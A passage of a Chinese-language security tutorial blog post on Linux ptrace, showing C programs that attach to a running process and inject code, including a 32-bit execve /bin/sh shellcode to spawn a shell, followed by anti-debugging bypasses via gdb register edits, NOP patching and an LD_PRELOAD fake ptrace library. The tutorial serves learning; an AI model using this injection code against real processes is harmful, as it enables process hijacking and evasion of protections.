&lt;stdlib.h&gt;</span><br><span class="line">const int long_size &#x3D; sizeof(long);</span><br><span class="line"></span><br><span class="line">&#x2F;*主要通过PTRACE_PEEKDATA获取内存中的内容*&#x2F;</span><br><span class="line">void getdata(pid_t child, long addr, char *str, int len)</span><br><span class="line">&#123;   </span><br><span class="line">    char *backup;</span><br><span class="line">    int i, j;</span><br><span class="line">    union u&#123;</span><br><span class="line">            long val;</span><br><span class="line">            char chars[long_size];</span><br><span class="line">    &#125;data;</span><br><span class="line"></span><br><span class="line">    i &#x3D; 0;</span><br><span class="line">    j &#x3D; len&#x2F;long_size;</span><br><span class="line">    backup &#x3D; str;</span><br><span class="line"></span><br><span class="line">    while(i &lt; j) &#123;</span><br><span class="line">        data.val &#x3D; ptrace(PTRACE_PEEKDATA, child, addr + i * 4, NULL);</span><br><span class="line">        memcpy(backup,data.chars,long_size);</span><br><span class="line">        i++;</span><br><span class="line">        backup +&#x3D; long_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j &#x3D; len % long_size;</span><br><span class="line">    if(j !&#x3D; 0) &#123;</span><br><span class="line">        data.val &#x3D; ptrace(PTRACE_PEEKDATA, child, addr + i * 4, NULL);</span><br><span class="line">        memcpy(backup, data.chars, j);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*与getdata相反，主要通过PTRACE_POKEDATA向内存写内容*&#x2F;</span><br><span class="line">void putdata(pid_t child, long addr, char *str, int len)</span><br><span class="line">&#123;   </span><br><span class="line">    char *code;</span><br><span class="line">    int i, j;</span><br><span class="line">    union u&#123;</span><br><span class="line">            long val;</span><br><span class="line">            char chars[long_size];</span><br><span class="line">     &#125;data;</span><br><span class="line">    i &#x3D; 0;</span><br><span class="line">    j &#x3D; len &#x2F; long_size;</span><br><span class="line">    code &#x3D; str;</span><br><span class="line">    while(i &lt; j) &#123;</span><br><span class="line">        memcpy(data.chars, code, long_size);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, child, addr + i * 4, data.val);&#x2F;*函数写入是以words为单位的，所以我们我们需要转换成word类型，还需要指针每次增加4。*&#x2F;</span><br><span class="line">        ++i;</span><br><span class="line">        code +&#x3D; long_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j &#x3D; len % long_size;</span><br><span class="line">    if(j !&#x3D; 0) &#123;</span><br><span class="line">        memcpy(data.chars, code, j);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, child, addr + i * 4, data.val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;   </span><br><span class="line">    pid_t traced_process;&#x2F;&#x2F;实际就是int类型</span><br><span class="line">    struct user_regs_struct regs, newregs;&#x2F;&#x2F;定义数据寄存器数据结构的两个变量，regs，newregs</span><br><span class="line">    long ins;</span><br><span class="line">    &#x2F;*</span><br><span class="line">    struct user_regs_struct &#123;</span><br><span class="line">    unsigned long    r15;</span><br><span class="line">    unsigned long    r14;</span><br><span class="line">    unsigned long    r13;</span><br><span class="line">    unsigned long    r12;</span><br><span class="line">    unsigned long    bp;</span><br><span class="line">    unsigned long    bx;</span><br><span class="line">    unsigned long    r11;</span><br><span class="line">    unsigned long    r10;</span><br><span class="line">    unsigned long    r9;</span><br><span class="line">    unsigned long    r8;</span><br><span class="line">    unsigned long    ax;</span><br><span class="line">    unsigned long    cx;</span><br><span class="line">    unsigned long    dx;</span><br><span class="line">    unsigned long    si;</span><br><span class="line">    unsigned long    di;</span><br><span class="line">    unsigned long    orig_ax;</span><br><span class="line">    unsigned long    ip;</span><br><span class="line">    unsigned long    cs;</span><br><span class="line">    unsigned long    flags;</span><br><span class="line">    unsigned long    sp;</span><br><span class="line">    unsigned long    ss;</span><br><span class="line">    unsigned long    fs_base;</span><br><span class="line">    unsigned long    gs_base;</span><br><span class="line">    unsigned long    ds;</span><br><span class="line">    unsigned long    es;</span><br><span class="line">    unsigned long    fs;</span><br><span class="line">    unsigned long    gs;</span><br><span class="line">&#125;;*&#x2F;</span><br><span class="line">    &#x2F;* int 0x80, int 3 *&#x2F;</span><br><span class="line">    char code[] &#x3D; &#123;0xcd,0x80,0xcc,0&#125;; &#x2F;&#x2F;定义字符数组，存的是将要插入的机器码</span><br><span class="line">    char backup[4]; &#x2F;&#x2F;定义接收原内存机器码的字符数组，这里应该和code[]字符数量相对应</span><br><span class="line">    traced_process &#x3D; atoi(argv[1]); &#x2F;&#x2F;这里把传入的pid转换成int类型</span><br><span class="line">    </span><br><span class="line">    &#x2F;*attack指定pid进程，traced_process*&#x2F;</span><br><span class="line">    ptrace(PTRACE_ATTACH, traced_process,NULL, NULL);&#x2F;&#x2F;跟踪pid进程</span><br><span class="line">    wait(NULL); &#x2F;&#x2F;等待系统通知</span><br><span class="line">    ptrace(PTRACE_GETREGS, traced_process, NULL, &amp;regs);&#x2F;*获取目标进程的所有寄存器值，存入regs结构体变量中，为以后恢复原rip,以及各个寄存器的值做准备*&#x2F;</span><br><span class="line">    printf(&quot;eip&#x3D;%lld\n&quot;,regs.rip);</span><br><span class="line">    getdata(traced_process, regs.rip, backup, 3);&#x2F;* 将rip指向地址中的机器码备份到backup中*&#x2F;</span><br><span class="line">    putdata(traced_process, regs.rip, code, 3); &#x2F;* 将int 0x80, int 3指令的机器码写入rip指向内存地址中，int 0x80长度为2，int3长度为1*&#x2F;</span><br><span class="line">    x</span><br><span class="line">    &#x2F;* 让目标进程继续执行并执行我们插入的int 0x80，int 3指令 *&#x2F;</span><br><span class="line">    ptrace(PTRACE_CONT, traced_process, NULL, NULL);</span><br><span class="line">    wait(NULL);&#x2F;&#x2F;等待系统通知</span><br><span class="line">    printf(&quot;This process is attacked by 0xAXSDD! Press &lt;enter&gt; to continue!&quot;);</span><br><span class="line">    getchar();&#x2F;&#x2F;捕获一个&lt;enter&gt;输入</span><br><span class="line">    putdata(traced_process, regs.rip, backup, 3); &#x2F;*将backup原指令机器码恢复到原rip指向的地址中*&#x2F;</span><br><span class="line">    ptrace(PTRACE_SETREGS, traced_process, NULL, &amp;regs); &#x2F;* 让rip指向的内存地址恢复到原本指向的地址，让目标进程继续执行，恢复rip指针 *&#x2F;</span><br><span class="line">    ptrace(PTRACE_DETACH, traced_process, NULL, NULL);&#x2F;* 结束跟踪*&#x2F;</span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>源码编译如果使用32位编译，相应rip改成eip，64位编译则不需要改。<br>测试用例，用个简单的c语言程序（32位编译）:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;    </span><br><span class="line">    printf(&quot;pid&#x3D;%d\n&quot;,getpid());</span><br><span class="line">    for(int num&#x3D;0;num&lt;20;num++)</span><br><span class="line">    &#123;</span><br><span class="line">    printf(&quot;num &#x3D; %d\n&quot;,num);</span><br><span class="line">    sleep(2);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我执行hacker程序的时候，hellword程序将被暂停（记得sudo执行hacker）</p>
<p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/4153844234591.png"></p>
<p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/1161212972586.png"></p>
<p>这里相当于劫持rip指针，而rip指针指向的地址将是即将执行的指令的地址。</p>
<p>稍微变动一下，直接插入一小段shellcode代码。</p>
<p>我们得明白有这几种情况：</p>
<ol>
<li>我们可以插入到当前要执行的指令之后，这是最直接的方式但是会破坏原有的目标进程，会导致原来的目标进程的后续功能受到破坏。/<em>下面得示例就用的这种方式</em>/</li>
<li>我们可以尝试注入代码到main函数地址处，但是有一定的几率是某些初始化的操作是在程序执行之前，因此我们首先需要让程序的正常工作。</li>
<li>另外的选择是使用ELF注入技巧，注入我们的代码，例如在内存中寻找空隙。</li>
<li>最后，我们可以在栈中注入代码，同一般的栈溢出，这是一种安全的方式可以避免破坏原有程序的方式。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys&#x2F;ptrace.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;wait.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;user.h&gt;</span><br><span class="line">#include &lt;asm&#x2F;ptrace-abi.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">const int long_size &#x3D; sizeof(long);</span><br><span class="line">&#x2F;*通过PTRACE_POKEDATA向内存写内容*&#x2F;</span><br><span class="line">void putdata(pid_t child, long addr, char *str, int len)</span><br><span class="line">&#123;   </span><br><span class="line">    char *code;</span><br><span class="line">    int i, j;</span><br><span class="line">    union u&#123;</span><br><span class="line">            long val;</span><br><span class="line">            char chars[long_size];</span><br><span class="line">     &#125;data;</span><br><span class="line">    i &#x3D; 0;</span><br><span class="line">    j &#x3D; len &#x2F; long_size;</span><br><span class="line">    code &#x3D; str;</span><br><span class="line">    while(i &lt; j) &#123;</span><br><span class="line">        memcpy(data.chars, code, long_size);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, child, addr + i * 4, data.val);</span><br><span class="line">        ++i;</span><br><span class="line">        code +&#x3D; long_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j &#x3D; len % long_size;</span><br><span class="line">    if(j !&#x3D; 0) &#123;</span><br><span class="line">        memcpy(data.chars, code, j);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, child, addr + i * 4, data.val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;   pid_t traced_process;</span><br><span class="line">    struct user_regs_struct regs;</span><br><span class="line">    long ins;</span><br><span class="line">    int len &#x3D; 25;</span><br><span class="line">    char insertcode[] &#x3D; &quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;;&#x2F;&#x2F;shellcode</span><br><span class="line">    traced_process &#x3D; atoi(argv[1]);</span><br><span class="line">    ptrace(PTRACE_ATTACH, traced_process,NULL, NULL);&#x2F;&#x2F;跟踪进程</span><br><span class="line">    wait(NULL);</span><br><span class="line">    ptrace(PTRACE_GETREGS, traced_process,NULL, &amp;regs);&#x2F;&#x2F;当前所有寄存器的值</span><br><span class="line">    putdata(traced_process,regs.eip,insertcode, len);&#x2F;&#x2F;写入shellcode</span><br><span class="line">    regs.eip +&#x3D;2 ;&#x2F;&#x2F;修改rip的值，指向我们注入的shellcode</span><br><span class="line">    ptrace(PTRACE_SETREGS, traced_process, NULL, &amp;regs);&#x2F;&#x2F;把修改后的寄存器的值写入被跟踪的进程</span><br><span class="line">    ptrace(PTRACE_CONT, traced_process,NULL, NULL);&#x2F;&#x2F;被跟踪的进程继续执行</span><br><span class="line">    printf(&quot;This process is attacked by 0xAXSDD! Press &lt;enter&gt; to continue!&quot;);</span><br><span class="line">    ptrace(PTRACE_DETACH, traced_process,NULL, NULL);&#x2F;&#x2F;结束跟踪</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里没有恢复到原先执行状态，因为我们直接getshell，不需要再返回到原程序中了。<br>运行效果截图<br><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/4265323362.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3628852827.png"></p>
<h2 id="绕过简单的ptrace"><a href="#绕过简单的ptrace" class="headerlink" title="绕过简单的ptrace"></a>绕过简单的ptrace</h2><p>上面谈论到ptrace在隐藏的过程中的攻防博弈，并没有说如何绕过ptrace，接下来我们讲如何绕过ptrace一些手段。</p>
<h3 id="1-通过gdb修改eax（64位rax）中的返回值来绕过ptrace"><a href="#1-通过gdb修改eax（64位rax）中的返回值来绕过ptrace" class="headerlink" title="1.通过gdb修改eax（64位rax）中的返回值来绕过ptrace"></a>1.通过gdb修改eax（64位rax）中的返回值来绕过ptrace</h3><p>理论依据：像这样的代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys&#x2F;ptrace.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    if (ptrace(PTRACE_TRACEME, 0, 0, 0) &#x3D;&#x3D;-1 )&#x2F;&#x2F;这里就直接先执行了ptrace(PTRACE_TRACEME, 0, 0, 0)，表示此程序已经被追踪</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;don&#39;t trace me！\n&quot;);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;no one trace me！\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我这里编译为64位<br>通过函数的返回值是否为-1来判断，是否正在被调试，如果我们直接修改ptrace的返回值，就可以绕过判断，ptrace函数执行之后的返回值将会保存在rax寄存器中，所以我们只需要在ptrace函数那里下断点，然后等ptrace函数结束后，利用set $rax=0指令来设置rax的值，那么就会绕过判断，就能继续调试程序。</p>
<p>演示：<br>直接sudo gdb hellword3进行gdb调试</p>
<p>然后输入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">catch syscall ptrace</span><br></pre></td></tr></table></figure>

<p>然后c继续执行，第一次暂停是发生在刚开始调用ptrace，然后继续n，n，直到返回到主函数，比较rax的值时候，注意，我们必须得在ptrace执行完成之后，返回到主函数时才更改rax的值</p>
<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/153030470666.png"></p>
<p>可以看到正常ptrace运行完之后，rax中的值为-1（32位为eax）</p>
<p>输入命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set $rax&#x3D;0</span><br></pre></td></tr></table></figure>

<p>然后继续运行，成功绕过ptrace反调试</p>
<p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2179340291.png"></p>
<h3 id="2-直接通过Binary-Ninja查找ptrace调用然后nop替换"><a href="#2-直接通过Binary-Ninja查找ptrace调用然后nop替换" class="headerlink" title="2.直接通过Binary Ninja查找ptrace调用然后nop替换"></a>2.直接通过Binary Ninja查找ptrace调用然后nop替换</h3><p>直接通过搜索文本，然后找到调用ptrace的地方</p>
<p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/367231987834.png"></p>
<p>直接选中这一行，然后右键，patch然后直接换成nop，就欧克了，然后另存！</p>
<p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/1639554964.png"></p>
<h3 id="3-使用LD-PRELOAD来劫持ptrace函数的调用"><a href="#3-使用LD-PRELOAD来劫持ptrace函数的调用" class="headerlink" title="3.使用LD_PRELOAD来劫持ptrace函数的调用"></a>3.使用LD_PRELOAD来劫持ptrace函数的调用</h3><p>这里只针对那些动态链接共享库的程序，局限性很大，通过创键本地自定义的伪造库，使用LD_PRELOAD来劫持ptrace调用库为我们自定义的伪造库，这样就起到了狸猫换太子的效果！</p>
<p>用的命令，共享库文件代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">long ptrace(int request, int pid, int addr, int data)</span><br><span class="line">&#123;</span><br><span class="line">     return 0;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>编译成共享库文件，然后LD_PRELOAD劫持</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc ptrace.c -o ptrace.so -fPIC -shared -ldl -D_GNU_SOURCE</span><br><span class="line">export LD_PRELOAD&#x3D;&quot;&#x2F;home&#x2F;hacker&#x2F;Reverse_debugging&#x2F;ptrace&#x2F;ptracE.SO&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/3920549679.png"></p>
<p>其他绕过反调试手法具体程序具体分析，以一变应万变！</p>
<p>完结完结！！！撒花撒花</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Harvey</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2021/03/04/linux-%E6%B2%99%E7%9B%92%E5%85%A5%E9%97%A8%EF%BC%8Cptrace%E4%BB%8E0%E5%88%B01/">http://example.com/2021/03/04/linux-%E6%B2%99%E7%9B%92%E5%85%A5%E9%97%A8%EF%BC%8Cptrace%E4%BB%8E0%E5%88%B01/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Mssn Harvey</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ptrace/">ptrace</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3929499452.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/03/05/CTFshow-%E7%BE%A4%E5%8F%8B%E6%8C%91%E6%88%98/"><img class="prev-cover" src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/3539444034.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">CTFshow-群友挑战</div></div></a></div><div class="next-post pull-right"><a href="/2021/03/03/DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/"><img class="next-cover" src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/dc1.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">DC-1靶机渗透测试报告</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/touxiang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Harvey</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">17</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/MssnHarvey/mssnharvey.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="tencent://AddContact/?fromId=50&amp;fromSubId=1&amp;subcmd=all&amp;uin=3305601910" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="https://t.me/MssnHarvey" target="_blank" title="Telegram"><i class="fab fa-telegram"></i></a><a class="social-icon" href="https://github.com/MssnHarvey" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:3305601910@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">Welcome to Harvey'Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFptrace%EF%BC%9F"><span class="toc-number">2.</span> <span class="toc-text">什么是ptrace？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">2.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="toc-number">2.2.</span> <span class="toc-text">基本原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ptrace%E5%87%BD%E6%95%B0%E7%9A%84%E5%AE%9A%E4%B9%89"><span class="toc-number">2.3.</span> <span class="toc-text">ptrace函数的定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ptrace%E5%87%BD%E6%95%B0%E7%9A%84%E5%86%85%E6%A0%B8%E5%AE%9E%E7%8E%B0"><span class="toc-number">2.4.</span> <span class="toc-text">ptrace函数的内核实现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ptrace%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">3.</span> <span class="toc-text">ptrace使用场景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B0%83%E8%AF%95%EF%BC%9A"><span class="toc-number">3.1.</span> <span class="toc-text">1.调试：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8F%8D%E8%B0%83%E8%AF%95"><span class="toc-number">3.2.</span> <span class="toc-text">2.反调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.</span> <span class="toc-text">3.代码注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E7%AE%80%E5%8D%95%E7%9A%84ptrace"><span class="toc-number">4.</span> <span class="toc-text">绕过简单的ptrace</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E9%80%9A%E8%BF%87gdb%E4%BF%AE%E6%94%B9eax%EF%BC%8864%E4%BD%8Drax%EF%BC%89%E4%B8%AD%E7%9A%84%E8%BF%94%E5%9B%9E%E5%80%BC%E6%9D%A5%E7%BB%95%E8%BF%87ptrace"><span class="toc-number">4.1.</span> <span class="toc-text">1.通过gdb修改eax（64位rax）中的返回值来绕过ptrace</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%9B%B4%E6%8E%A5%E9%80%9A%E8%BF%87Binary-Ninja%E6%9F%A5%E6%89%BEptrace%E8%B0%83%E7%94%A8%E7%84%B6%E5%90%8Enop%E6%9B%BF%E6%8D%A2"><span class="toc-number">4.2.</span> <span class="toc-text">2.直接通过Binary Ninja查找ptrace调用然后nop替换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E4%BD%BF%E7%94%A8LD-PRELOAD%E6%9D%A5%E5%8A%AB%E6%8C%81ptrace%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8"><span class="toc-number">4.3.</span> <span class="toc-text">3.使用LD_PRELOAD来劫持ptrace函数的调用</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/03/16/BUUCTF-Web%E5%88%86%E7%B1%BB%E7%BB%83%E4%B9%A0/" title="BUUCTF-Web分类练习"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1689581160.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUCTF-Web分类练习"/></a><div class="content"><a class="title" href="/2021/03/16/BUUCTF-Web%E5%88%86%E7%B1%BB%E7%BB%83%E4%B9%A0/" title="BUUCTF-Web分类练习">BUUCTF-Web分类练习</a><time datetime="2021-03-16T06:33:20.000Z" title="发表于 2021-03-16 14:33:20">2021-03-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/15/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/" title="DC-3靶机渗透测试报告"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/dc3.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DC-3靶机渗透测试报告"/></a><div class="content"><a class="title" href="/2021/03/15/DC-3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/" title="DC-3靶机渗透测试报告">DC-3靶机渗透测试报告</a><time datetime="2021-03-15T06:11:00.000Z" title="发表于 2021-03-15 14:11:00">2021-03-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/14/VNCTF%202021/" title="VNCTF 2021"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/653112701.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="VNCTF 2021"/></a><div class="content"><a class="title" href="/2021/03/14/VNCTF%202021/" title="VNCTF 2021">VNCTF 2021</a><time datetime="2021-03-14T07:13:20.000Z" title="发表于 2021-03-14 15:13:20">2021-03-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/12/CTF-%E5%8E%8B%E7%BC%A9%E5%8C%85%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/" title="CTF-压缩包那些事儿"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/ctfysb.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTF-压缩包那些事儿"/></a><div class="content"><a class="title" href="/2021/03/12/CTF-%E5%8E%8B%E7%BC%A9%E5%8C%85%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/" title="CTF-压缩包那些事儿">CTF-压缩包那些事儿</a><time datetime="2021-03-12T06:11:00.000Z" title="发表于 2021-03-12 14:11:00">2021-03-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/09/DC-2%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/" title="DC-2靶机渗透测试报告"><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/dc2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DC-2靶机渗透测试报告"/></a><div class="content"><a class="title" href="/2021/03/09/DC-2%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/" title="DC-2靶机渗透测试报告">DC-2靶机渗透测试报告</a><time datetime="2021-03-09T06:11:00.000Z" title="发表于 2021-03-09 14:11:00">2021-03-09</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By Harvey</div><div class="framework-info"><span>框架 </span><a 